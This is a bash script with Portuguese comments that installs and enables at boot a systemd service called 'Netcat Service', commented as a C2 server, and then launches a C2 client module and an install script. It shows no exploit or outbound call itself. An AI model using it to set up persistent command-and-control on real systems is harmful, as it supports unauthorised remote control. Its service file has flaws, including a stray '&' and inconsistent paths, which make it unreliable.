#!/bin/bash

source .env

# Verificar se o script está sendo executado como root
if [ "$EUID" -ne 0 ]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

SERVER_SERVICE_NAME="play.service"

# Função para ativar o ambiente virtual e iniciar as aplicações
activate_venv_and_start_app() {
    # Ativação do ambiente virtual
    source "$VENV_DIR/$VENV_NAME/bin/activate"
}
activate_venv_and_start_app

# Criar arquivo de serviço para o C2 SERVER SERVICE
echo "[Unit]
Description=Netcat Service
After=network.target

[Service]
Type=simple
Restart=always
ExecStart=/usr/bin/python3 $INIT_DIR//tools/play.py &
User=$USER

[Install]
WantedBy=multi-user.target" > "$SERVICE_FILE/$SERVER_SERVICE_NAME"

# Recarregar serviços do systemd
sudo systemctl daemon-reload

# Iniciar e habilitar o serviço nc
sudo systemctl unmask $SERVER_SERVICE_NAME
sudo systemctl start $SERVER_SERVICE_NAME
sudo systemctl enable $SERVER_SERVICE_NAME

echo "Configuração do serviço Netcat concluída no Servidor."

sudo "$INIT_DIR/$REPO/tools/C2/modules/client.sh"
sudo "$INIT_DIR/$REPO/tools/install.sh"